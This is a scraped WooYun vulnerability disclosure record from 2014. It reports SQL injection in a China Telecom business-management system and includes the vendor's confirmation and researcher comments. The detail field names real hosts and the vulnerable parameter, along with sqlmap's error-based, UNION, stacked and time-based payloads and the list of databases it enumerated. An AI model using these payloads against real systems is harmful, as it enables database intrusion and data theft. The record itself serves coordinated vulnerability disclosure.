{"id": 5453, "wybug_id": "wooyun-2014-050013", "wybug_title": "中国电信某通用业务系统sql注入漏洞", "wybug_corp": "中国电信", "wybug_author": "霍大然", "wybug_date": "2014-01-29 10:18", "wybug_open_date": "2014-03-15 10:19", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入", "通用业务"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-15：\t细节向公众公开  简要描述： 中国电信某通用业务系统sql注入漏洞 详细说明：  中国电信通信助理统一业务管理系统\n\n用http://116.228.55.12/做案例，注入点：http://116.228.55.12:80/clerk_communication/getdata.aspx?action=GetCity2&pcode=* (GET)sqlmap identified the following injection points with a total of 41 HTTP(s) requests:---Place: URIParameter: #1*    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: http://116.228.55.12:80/clerk_communication/getdata.aspx?action=GetCity2&pcode=' AND 7328=CONVERT(INT,(SELECT CHAR(113)+CHAR(98)+CHAR(122)+CHAR(99)+CHAR(113)+(SELECT (CASE WHEN (7328=7328) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(102)+CHAR(98)+CHAR(118)+CHAR(113))) AND 'lduX'='lduX    Type: UNION query    Title: Generic UNION query (NULL) - 6 columns    Payload: http://116.228.55.12:80/clerk_communication/getdata.aspx?action=GetCity2&pcode=' UNION ALL SELECT NULL,CHAR(113)+CHAR(98)+CHAR(122)+CHAR(99)+CHAR(113)+CHAR(117)+CHAR(108)+CHAR(110)+CHAR(116)+CHAR(110)+CHAR(67)+CHAR(107)+CHAR(67)+CHAR(108)+CHAR(73)+CHAR(113)+CHAR(102)+CHAR(98)+CHAR(118)+CHAR(113),NULL,NULL,NULL,NULL--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: http://116.228.55.12:80/clerk_communication/getdata.aspx?action=GetCity2&pcode='; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: http://116.228.55.12:80/clerk_communication/getdata.aspx?action=GetCity2&pcode=' WAITFOR DELAY '0:0:5'-----web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000available databases [9]:[*] Comm_Assistant_new[*] HBSearch[*] lumigent[*] master[*] model[*] msdb[*] Northwind[*] pubs[*] tempdb\n\n\n\n另一个站：http://mob.118114.cn/\n\n   漏洞证明：  界面不一样，但页面结构是一样的，注入点也一样，改下地址：http://mob.118114.cn:80/clerk_communication/getdata.aspx?action=GetCity2&pcode=* (GET)可以直接拿到数据：\n\n再一个站：改下另一系统IP地址：\n\n\n\n   修复方案：  统一解决   版权声明：转载请注明来源 霍大然@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2014-02-01 22:51 厂商回复： CNVD确认并复现所述多个实例情况，已经转由CNCERT直接通报中国电信集团公司处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-29 11:12 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  通用的？！    \n     2014-01-29 11:21 |    \t\t霍大然 \t\t\t( 普通白帽子  |\t\t\t        Rank:1136 漏洞数:178        | W币花完了，刷分还是不刷？)\t\t \n  @wefgod 只是百度了一些样例    \n     2014-01-29 11:37 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @霍大然 不愧是大牛    \n     2014-01-29 11:56 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  还有两天就过年了，还这么有激情    \n     2014-03-16 20:01 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  看见有个是JSP的啊……不是.NET    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}